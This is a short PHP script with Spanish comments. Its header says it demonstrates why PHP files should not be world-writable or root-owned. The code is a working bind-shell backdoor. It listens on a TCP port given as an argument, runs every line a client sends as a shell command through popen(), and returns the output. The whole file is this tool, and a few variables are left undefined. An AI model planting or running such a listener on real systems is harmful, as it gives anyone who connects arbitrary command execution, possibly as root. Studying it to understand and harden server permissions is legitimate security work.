#!/usr/bin/php -q
<?php
/*
 *	Una razon muy simple porque un archivo con extension PHP
 *	no debe tener permios 777 ni dueño root
 */
	echo "sin args:".$argvs;
	$address = $argv[1];
	$port = $argv[2];
	// creamos un socket de tipo TCP
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)
		echo "Error: " . socket_strerror(socket_last_error()) . "\n";
	//establece el socket
	if (socket_bind($sock, $address, $port) === false)
		echo "Error: " . socket_strerror(socket_last_error($sock)) . "\n";
	//pone a la escucha el socket
	if(socket_listen($sock, 5) === false)
		echo "Error: " . socket_strerror(socket_last_error($sock)) . "\n";
	
	do
	{
		if (($msgsock = socket_accept($sock)) === false)
		{
			echo "Error: " . socket_strerror(socket_last_error($sock)) . "\n";
			break;
		}
	
		/* Enviar instrucciones. */
		socket_write($msgsock, $msg, strlen($msg));
		do
		{
			if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ)))
			{
				echo "Error: " . socket_strerror(socket_last_error($msgsock)) . "\n";
				break 2;
			}
			if (!$buf = trim($buf))
			{
				continue;
			}
			else
			{
				switch($buf)
				{
					case 'quit':
						break;
					break;
					case 'shutdown':
						socket_close($msgsock);
						die();
						break;
					default:
						$rec = popen($buf,"r");
						$salida = fread($rec,2096);
						socket_write($msgsock,$salida,strlen($salida));
						pclose($rec);
						break;
				}
			}
			socket_write($msgsock,"# ",strlen("#"));
		}
		while (true);
		socket_close($msgsock);
	}
	while (true);
	socket_close($sock);
?>